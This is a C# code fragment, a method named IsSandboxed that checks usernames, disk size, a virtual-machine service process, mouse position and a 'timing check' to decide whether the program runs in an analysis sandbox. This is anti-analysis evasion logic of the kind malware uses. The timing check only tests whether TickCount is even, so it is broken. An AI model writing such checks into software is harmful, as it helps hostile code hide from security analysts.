        private bool IsSandboxed()
        {
            try
            {
                // existing
                string user = Environment.UserName.ToLower();
                long disk = new DriveInfo("C").TotalSize;

                // additional heuristics:
                if (Process.GetProcessesByName("vmsrvc").Any()) return true;
                if (Mouse.PrimaryDevice.GetPosition(null) == new Point(0, 0)) return true;
                if ((Environment.TickCount & 1) == 0) return true; // simple timing check

                return user.Contains("sandbox") || user.Contains("test") || disk < 60L * 1024 * 1024 * 1024;
            }
            catch { return true; }
        }


